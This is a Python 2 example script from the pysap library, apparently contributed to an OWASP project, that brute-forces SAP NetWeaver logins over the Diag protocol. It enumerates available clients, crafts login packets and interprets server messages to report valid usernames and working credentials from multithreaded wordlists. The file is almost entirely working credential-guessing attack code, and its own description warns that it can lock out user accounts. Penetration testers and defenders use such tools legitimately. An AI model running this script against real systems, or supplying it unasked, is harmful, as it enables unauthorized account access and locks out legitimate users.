#!/usr/bin/env python2
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
import logging
from string import letters
from random import choice
from argparse import ArgumentParser
# External imports
from scapy.config import conf
from scapy.packet import bind_layers
# Custom imports
import pysap
from pysap.SAPNI import SAPNI
from pysap.utils import ThreadPool
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPDiagItems import *
from pysap.SAPDiagClient import SAPDiagConnection


# Bind the SAPDiag layer
bind_layers(SAPNI, SAPDiag,)
bind_layers(SAPNI, SAPDiagDP,)
bind_layers(SAPDiagDP, SAPDiag,)
bind_layers(SAPDiag, SAPDiagItem,)
bind_layers(SAPDiagItem, SAPDiagItem,)


# Set the verbosity to 0
conf.verb = 0


# TODO: Add support for interpolating usernames with SID/CLIENT to test for SOLMAN accounts


# Command line options parser
def parse_options():

    description = "This example script can be used to perform a brute force attack against a SAP Netweaver " \
                  "application server. The scripts performs a login through the Diag protocol. It can also discover " \
                  "available clients. Consider that this can lock out user accounts and run it at your own risk."

    usage = "%(prog)s [options] -d <remote host>"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    target = parser.add_argument_group("Target")
    target.add_argument("-d", "--remote-host", dest="remote_host",
                        help="Remote host")
    target.add_argument("-p", "--remote-port", dest="remote_port", type=int, default=3200,
                        help="Remote port [%(default)d]")
    target.add_argument("--route-string", dest="route_string",
                        help="Route string for connecting through a SAP Router")

    credentials = parser.add_argument_group("Credentials")
    credentials.add_argument("-u", "--usernames", dest="usernames", metavar="FILE",
                             help="Usernames file")
    credentials.add_argument("-l", "--passwords", dest="passwords", metavar="FILE",
                             help="Passwords file")
    credentials.add_argument("-m", "--client", dest="client", default="000,001,066",
                             help="Client number [%(default)s]")
    credentials.add_argument("-c", "--credentials", dest="credentials", metavar="FILE",
                             help="Credentials file (username:password:client)")

    discovery = parser.add_argument_group("Clients Discovery")
    discovery.add_argument("--discovery", dest="discovery", action="store_true",
                           help="Performs discovery of available clients")
    discovery.add_argument("--discovery-range", dest="discovery_range", default="000-099",
                           help="Client range for the discovery of available clients [%(default)s]")

    misc = parser.add_argument_group("Misc options")
    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")
    misc.add_argument("--threads", dest="threads", type=int, default=1,
                      help="Number of threads [%(default)d]")
    misc.add_argument("--terminal", dest="terminal", default=None,
                      help="Terminal name")

    options = parser.parse_args()

    if not (options.remote_host or options.route_string):
        parser.error("Remote host or route string is required")

    return options


def make_login(username, password, client):

    # SES item
    ses = SAPDiagSES(eventarray=1)

    # Login information is sent to the server as Dynt Atoms
    login_atom = SAPDiagDyntAtom(items=[
        SAPDiagDyntAtomItem(field2_text=client, field2_maxnrchars=3, row=0, group=0, dlg_flag_2=0, dlg_flag_1=0,
                            etype=130, field2_mlen=3, attr_DIAG_BSD_YES3D=1, field2_dlen=len(client), block=1, col=20),
        SAPDiagDyntAtomItem(field2_text=username, field2_maxnrchars=12, row=2, group=0, dlg_flag_2=1, dlg_flag_1=0,
                            etype=130, field2_mlen=12, attr_DIAG_BSD_YES3D=1, field2_dlen=len(username), block=1, col=20),
        SAPDiagDyntAtomItem(field2_text=password, field2_maxnrchars=40, row=3, group=0, dlg_flag_2=1, dlg_flag_1=4,
                            etype=130, field2_mlen=12, attr_DIAG_BSD_YES3D=1, attr_DIAG_BSD_INVISIBLE=1,
                            field2_dlen=len(password), block=1, col=20)])
    # An XML Blob is also required
    xml_blob = """<?xml version="1.0" encoding="sap*"?><DATAMANAGER><COPY id="copy"><GUI id="gui"><METRICS id="metrics" X3="2966" X2="8" X1="8" X0="283" Y3="900" Y2="23" Y1="17" Y0="283"/></GUI></COPY></DATAMANAGER>"""

    return [SAPDiagItem(item_value=ses, item_type=1),
            SAPDiagItem(item_value='\x00\x05\x00\x00\x03\x1c\x13\x1a\x5a\x5b\x15\x5a\x00\x13\x00\x00\x5b\x00\x00\x00\x00\x00', item_type=16, item_id=5, item_sid=1),
            SAPDiagItem(item_value=login_atom, item_type=18, item_id=9, item_sid=2),
            SAPDiagItem(item_value=xml_blob, item_type=17),
            ]


def get_rand(length):
    return ''.join(choice(letters) for _ in range(length))


def is_duplicate_login(response):
    if response[SAPDiag].get_item("APPL4", "DYNT", "DYNT_ATOM"):
        for item in response[SAPDiag].get_item("APPL4", "DYNT", "DYNT_ATOM"):
            if item.item_value:
                for atom in item.item_value.items:
                    if atom.dlg_flag_1 is 0 and atom.dlg_flag_2 is 0 and atom.field2_text:
                        if "is already logged on in" in atom.field2_text:
                            return True, atom.field2_text
    return False, ""


def login(host, port, terminal, route, username, password, client, verbose, results):
    """Perform a login try with the username and password. Tries to determine if either the username
    or the combination of username and password is valid for the given client.
    """
    user_valid = False
    login_success = False
    status = ''

    # Create the connection to the SAP Netweaver server
    connection = SAPDiagConnection(host, port, terminal=terminal,
                                   compress=False, init=True, route=route)

    # Send the login using the given username, password and client
    response = connection.interact(make_login(username, password, client))

    # If the response contain a MESSAGE item, it could be a error message of the user requesting a password change
    if response[SAPDiag].get_item("APPL", "ST_R3INFO", "MESSAGE"):
        status = response[SAPDiag].get_item("APPL", "ST_R3INFO", "MESSAGE")[0].item_value
        # Check if the password is expired
        if status == "Enter a new password":
            user_valid = login_success = True
            status = "Expired password"
        elif status == "E: Log on with a dialog user":
            user_valid = True
            login_success = False
            status = "No Dialog user (log on with RFC)"
        elif status[:10] == "E: Client ":
            user_valid = login_success = False
            status = "Client does not exist"
    # Check if the user is already logged in
    elif is_duplicate_login(response)[0]:
        status = is_duplicate_login(response)[1]
        user_valid = login_success = True
    # If the ST_USER USERNAME item is set to the username, the login was successful
    elif response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME"):
        st_username = response[SAPDiag].get_item("APPL", "ST_USER", "USERNAME")[0].item_value
        if st_username == username:
            user_valid = login_success = True
    # If the response doesn't contain a message item but the Internal Mode Number is set to 1, we have found a
    # successful login
    elif response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER"):
        imodenumber = response[SAPDiag].get_item("APPL", "ST_R3INFO", "IMODENUMBER")[0].item_value
        if imodenumber == "\x00\x01":
            user_valid = login_success = True

    # Otherwise, we are dealing with an unknown response
    else:
        status = "Unknown error"

    # Close the connection
    connection.close()

    if verbose:
        print("[*] Results: \tClient: %s\tUsername: %s\tPassword: %s\t"
              "Username Valid: %s\tPassword Valid: %s\tStatus: %s" % (client, username, password,
                                                                      user_valid, login_success,
                                                                      status))
    results.append((user_valid, login_success, status, username, password, client))


def discover_client(host, port, terminal, route, client, verbose, results):
    """
    Test if a client is available on the application server, by setting the client and using a
    random username/password, and looking at the response's message.
    """

    client = "%03d" % client
    login_results = []
    login(host, port, terminal, route, get_rand(8), get_rand(8), client, verbose, login_results)
    (_, _, status, _, _, client) = login_results[0]

    # Check for the positive signs that the client doesn't exist
    unavailable = "E: Client %s is not available in this system"
    unexistent = "Client does not exist"
    license_check = "E: Logon not possible (error in license check)"
    if status in [license_check, unavailable % client, unexistent]:
        available = False

    # Otherwise assume the client does exist to be on the safe side
    else:
        available = True

    results.append((client, available, status))


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    print("[*] Testing %s:%d" % (options.remote_host, options.remote_port))

    # Start the thread pool
    pool = ThreadPool(options.threads)

    # If discovery option was specified, discover available clients
    if options.discovery is True:

        # Get the client range to test
        (client_min, client_max) = options.discovery_range.split("-")
        print("[*] Discovering clients (%s-%s) ..." % (client_min, client_max))
        # Add the tasks to the threadpool
        results = []
        for client in range(int(client_min), int(client_max) + 1):
            pool.add_task(discover_client, options.remote_host,
                          options.remote_port, options.terminal,
                          options.route_string, client, options.verbose,
                          results)
        pool.wait_completion()

        # Collect the results
        client_list = []
        for (client, success, status) in results:
            if success:
                client_list.append(client)

        print("[*] Clients found potentially available: %s" % ','.join(client_list))
    else:
        print("[*] Not discovering clients, using %s or client supplied in credentials file" % options.client)
        client_list = options.client.split(',')

    # Check if we should test for passwords or finish only with the discovery
    if not options.credentials and not(options.usernames and options.passwords):
        print("[*] Not testing passwords as credentials or usernames/passwords files were not provided")
        exit(0)

    # Build the test cases using either the supplied credentials file (username:password:client) or the
    # username/password file
    testcases = []
    if options.credentials:
        try:
            with open(options.credentials) as creds_file:
                for line in creds_file.readlines():
                    line = line.strip()

                    # Check for comments or empty lines
                    if len(line) == 0 or line.startswith("#"):
                        continue

                    (username, password, clients) = line.split(':')
                    if clients == "*":
                        clients = client_list
                    else:
                        clients = clients.split(',')

                    for client in clients:
                        testcases.append((username, password, client))
        except IOError:
            print("Error reading credentials file !")
            exit(0)
        except ValueError:
            print("Invalid credentials file format !")
            exit(0)
    else:
        try:
            with open(options.usernames) as usernames_file, open(options.passwords) as passwords_file:
                for username in usernames_file.readlines():
                    username = username.strip()
                    # Check for comments or empty lines
                    if len(username) == 0 or username.startswith("#"):
                        continue
                    for password in passwords_file.readlines():
                        password = password.strip()
                        # Check for comments or empty lines
                        if len(password) == 0 or password.startswith("#"):
                            continue
                        for client in client_list:
                            testcases.append((username, password, client))
        except IOError:
            print("Error reading username or passwords file !")
            exit(0)

    # Add the test cases to the threadpool
    results = []
    for username, password, client in testcases:
        if options.verbose:
            print("[*] Adding testcase for username %s with password %s on client %s" % (username, password, client))
        pool.add_task(login, options.remote_host, options.remote_port,
                      options.terminal, options.route_string, username,
                      password, client, options.verbose, results)

    pool.wait_completion()

    # Print the credentials found
    for (user_valid, login_success, status, username, password, client) in results:
        if user_valid and not login_success:
            print("[+] Valid username found: \tClient: %s\tUsername: %s\tStatus: %s" % (client,
                                                                                        username,
                                                                                        status))
        elif login_success:
            print("[+] Valid credentials found: \tClient: %s\tUsername: %s\tPassword: %s\tStatus: %s" % (client,
                                                                                                         username,
                                                                                                         password,
                                                                                                         status))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[*] Canceled by the user ...")
        exit(0)
